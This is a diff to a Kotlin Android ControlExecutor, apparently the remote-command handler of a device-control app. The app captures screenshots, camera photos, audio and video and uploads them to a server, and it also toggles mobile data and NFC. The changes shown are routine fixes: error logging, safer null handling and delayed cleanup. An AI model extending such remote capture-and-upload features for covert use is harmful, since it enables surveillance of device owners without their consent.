@@ -153,15 +153,12 @@ object ControlExecutor {
             )
             player?.isLooping = true
             player?.start()
+            player?.setOnCompletionListener { it.release() }
             
             // Auto-stop after 30 seconds
-            Thread { 
-                Thread.sleep(30000)
-                try { 
-                    player?.stop()
-                    player?.release()
-                } catch (_: Exception) {}
-            }.start()
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                try { player?.stop(); player?.release() } catch (_: Exception) {}
+            }, 30000)
             "Ringing..."
         } catch (e: Exception) {
             Log.e(TAG, "Ring error", e)
@@ -269,7 +266,7 @@ object ControlExecutor {
                 CoroutineScope(Dispatchers.IO).launch {
                     try {
                         ApiClient.uploadFile(file, "screenshot")
-                    } catch (_: Exception) {}
+                    } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
                 }
                 
                 // Return full base64 for streaming viewer (server caches this)
@@ -342,7 +339,8 @@ object ControlExecutor {
             val characteristics = manager.getCameraCharacteristics(cameraId)
             val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
             val sizes = map?.getOutputSizes(ImageFormat.JPEG)
-            val size = sizes?.maxByOrNull { it.width * it.height }!!
+            val size = sizes?.maxByOrNull { it.width * it.height }
+                ?: return mapOf("error" to "No supported JPEG sizes")
             
             // Create image reader
             val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
@@ -364,7 +362,7 @@ object ControlExecutor {
                         
                         // Upload in background (with device_id for server identification)
                         CoroutineScope(Dispatchers.IO).launch {
-                            try { ApiClient.uploadFile(file, "camera") } catch (_: Exception) {}
+                            try { ApiClient.uploadFile(file, "camera") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
                         }
                         
                         image.close()
@@ -527,7 +525,7 @@ object ControlExecutor {
             if (file != null && file.exists()) {
                 // Upload to server
                 CoroutineScope(Dispatchers.IO).launch {
-                    try { ApiClient.uploadFile(file, "audio") } catch (_: Exception) {}
+                    try { ApiClient.uploadFile(file, "audio") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
                 }
                 
                 mapOf(
@@ -668,7 +666,7 @@ object ControlExecutor {
             if (file != null && file.exists()) {
                 // Upload to server
                 CoroutineScope(Dispatchers.IO).launch {
-                    try { ApiClient.uploadFile(file, "video") } catch (_: Exception) {}
+                    try { ApiClient.uploadFile(file, "video") } catch (e: Exception) { Log.w(TAG, "Upload failed", e) }
                 }
                 
                 mapOf(
@@ -923,7 +921,21 @@ object ControlExecutor {
         }
     }
 
-    fun disableMobileData(context: Context): String = enableMobileData(context)
+    fun disableMobileData(context: Context): String {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                context.startActivity(Intent(Settings.Panel.ACTION_INTERNET_CONNECTIVITY).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                })
+                "Opening mobile data settings (direct toggle requires system privileges on Android 10+)"
+            } else {
+                "Mobile data control requires system privileges on newer Android"
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Disable mobile data error", e)
+            "Opening mobile data settings (direct toggle requires system privileges on Android 10+)"
+        }
+    }
 
     // ===== HOTSPOT =====
     fun enableHotspot(context: Context): String {
@@ -1356,7 +1368,21 @@ object ControlExecutor {
         }
     }
     
-    fun nfcOff(context: Context): String = nfcOn(context)
+    fun nfcOff(context: Context): String {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                context.startActivity(Intent(Settings.Panel.ACTION_NFC).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                })
+                "Opening NFC settings to disable"
+            } else {
+                "NFC control requires WRITE_SETTINGS or system privileges"
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "NFC off error", e)
+            "Error: ${e.message}"
+        }
+    }
 
     // ===== DNS CHANGE =====
     fun dnsChange(context: Context, params: Map<String, Any>): String {
@@ -1426,7 +1452,9 @@ object ControlExecutor {
             }
             
             screenImageReader?.close()
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            Log.w(TAG, "Cleanup error", e)
+        }
         
         cameraDevice = null
         cameraSession = null
